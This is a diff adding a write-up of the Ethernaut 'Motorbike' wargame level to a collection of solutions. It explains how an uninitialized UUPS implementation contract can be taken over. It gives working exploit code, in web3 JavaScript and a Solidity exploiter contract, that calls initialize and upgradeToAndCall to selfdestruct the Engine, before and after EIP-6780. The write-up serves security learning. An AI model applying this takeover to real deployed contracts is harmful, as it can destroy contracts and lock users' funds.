@@ -28,6 +28,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 23. [Level 22: Dex](#level-22-dex)
 24. [Level 22: Dex 2](#level-23-dex-2)
 25. [Level 24: Puzzle Wallet](#level-24-puzzle-wallet)
+26. [Level 25: Motorbike](#level-25-motorbike)
 
 
 
@@ -2356,3 +2357,296 @@ From the level:
 >Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.
 >
 >Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.
+
+## Level 25: Motorbike <a name="level-25-motorbike">
+
+As always, let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity <0.7.0;
+
+import "openzeppelin-contracts-06/utils/Address.sol";
+import "openzeppelin-contracts-06/proxy/Initializable.sol";
+
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) public {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback() external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r_slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+
+        AddressSlot storage r;
+        assembly {
+            r_slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+```
+
+We have here a Motorbike which uses UUPS to call the Engine contract. We can
+see that the Motorbike contract has a `_IMPLEMENTATION_SLOT` constant, which
+is from EIP-1967. It just defines a slot in which the implementation contract's
+address is stored in.
+
+If we run `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
+we get a `bytes32` value, where the last 20 bytes are the address of the Engine
+contract.
+
+Nice, we already know where the engine contract is :)
+
+What's actually our objective? We have to make the Motorbike unusable by
+calling `selfdestruct` on the Engine contract.
+
+Here comes the tricky part - the behaviour of `selfdestruct` depends on if the
+network had the Dencun upgrade or not. Here a snippet from EIP-6780:
+
+>The new functionality will be only to send all Ether in the account to the
+>target, except that the current behaviour is preserved when SELFDESTRUCT
+>is called in the same transaction a contract was created.
+
+That means, a contract will only be destroyed if `selfdestruct` is called in the
+same transaction as the contract was created.
+
+Alright, let's first "exploit" pre-EIP6780.
+
+The engine contract doesn't have a constructor, since the constructor sets the
+state in the context of the Engine contract. The developer wants to use the
+Engine of the Motorbike contract, and implemented therefore the `initialize`
+function. We can see in the Motorbike constructor, that the `initialize` function
+is called, in order to configure everything in the context of the Motorbike.
+
+If we look at the documentation for [Writing Upgradable Contract](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract)
+we can see the following sentence:
+
+>Do not leave an implementation contract uninitialized.
+
+Aha, and here we have an uninitialized Engine contract :) That's our way in.
+
+But wait, the Engine contract doesn't have the `selfdestruct` instruction...
+
+But it has `upgradeToAndCall` function, which allows us to upgrade the implementation
+contract and call a function on the new implementation contract.
+
+We are going to deploy a contract which has the `selfdestruct` instruction first:
+
+```solidity
+contract EngineDestroyer {
+    function blowUpTheEngine() external {
+        selfdestruct(payable(0));
+    }
+}
+```
+
+and call the following functions on the Engine contract itself:
+
+```javascript
+engineAddress = await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+engineAddress = '0x' + engineAddress.substring(26)
+
+initializeSig = web3.eth.abi.encodeFunctionCall({name: "initialize", type: "function", inputs: []}, [])
+await web3.eth.sendTransaction(from: player, to: engineAddress, data: initializeSig)
+selfDestructContractAddress = '<address>'
+selfDestructSig = web3.eth.abi.encodeFunctionSignature("blowUpTheEngine()")
+upgradeSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes',
+            name: 'data'
+        }
+    ]
+}
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, [selfDesturctContractAddress, selfDestructSig])
+await web3.eth.sendTransaction({from: player, to: contract.address, data: upgradeData})
+```
+And that's it :)
+
+Again, this should work for blockchain networks, where EIP-6780 is not implemented.
+
+Next, let's see how we can solve this level with EIP-6780.
+
+The behaviour of `selfdestruct` is only preserved if the contract is created and
+destroyed in the same transaction. 
+
+What does that mean for us? We have to create a contract, which is going to
+request a new instance, and then destroy the instance in the same transaction.
+
+Here a contract which does that:
+
+```solidity
+interface Engine {
+    function initialize() external virtual;
+    function upgradeToAndCall(address newImplementation, bytes memory data) external virtual;
+}
+
+contract MotorbikeExploiter {
+
+    address constant ethernaut = 0xB877915d8Ba049e7cAFc1525F85CEc322A362767;
+    address constant motorbikeLevel = 0xC0327531E3Be9A60566509d790aC89e99bd302C8;
+    address motorbike;
+
+    function exploit(uint256 nonce) public {
+        (bool success,) = ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", motorbikeLevel));
+        require(success, "Failed to create motorbike instance");
+
+        Engine engine = Engine(computeAddress(motorbikeLevel, nonce));
+        motorbike = computeAddress(motorbikeLevel, nonce + 1);
+
+        engine.initialize();
+        engine.upgradeToAndCall(address(this), abi.encodeCall(this.destroyEngine, ()));
+    }
+
+    function submitLevelInstance() public {
+        // submit the instance
+        (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
+        require(success, "Failed to submit level instance");
+    }
+
+    function destroyEngine() external {
+        selfdestruct(payable(0));
+    }
+
+    function computeAddress(address deployer, uint256 nonce) public pure returns (address) {
+        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
+        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
+        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
+        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));
+
+        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
+        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))));
+        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))));
+        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));
+
+        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
+        return addressFromLast20Bytes(
+            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
+        );
+    }
+
+    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
+        return address(uint160(uint256(bytesValue)));
+    }
+}
+```
+
+We hardcoded the address of the Ethernaut contract, which is responsible for
+deploying new instance. Once we deploy this contract and call the
+`exploit()` function, it is going to call the `createLevelInstance(address)` function
+and request for a new instance.
+
+Here now the tricky part - we need to know the address of the Motorbike and Engine
+contract during the transaction itself. Since addresses of contracts are deterministic,
+we can calculate the address of the Motorbike and Engine contract, based on the
+nonce of the level address, which you can see in the console.
+
+To get the current nonce of the level instance, just run
+`web3.eth.getTransactionCount(<level instance address>)` and provide it to the
+`exploit()` function.
+
+Once the Motorbike and Engine contract are created, we do the same steps as
+before - call `initialize()` and `upgradeToAndCall()` pointing to our contract
+and the `destroyEngine()` function.
+
+Once this transaction is done, we can submit the level. That has to be in a separate
+transaction, since once we call `selfdestruct` the contract is scheduled for
+removal right after the transaction is done. During the execution of the transaction,
+the contract is still alive.
+
+This is boiled down, which required some good amount of work :)
+
+What's not so cool about it? The deployed exploit contract gets the credit for
+solving the level, not the player. But hey, we are here to learn and not to
+brag about it :)
+
+Here the transaction where we exploited it: [Exploit Success](https://holesky.etherscan.io/tx/0x70fd3570946ad7925f72aeb30bf02e25bdc8640e81e37fd874e9ddaccc2a6340)
+
+### Learning
+
+Do not leave your logic contract uninitialized. Always make sure that the
+contract is properly initialized.
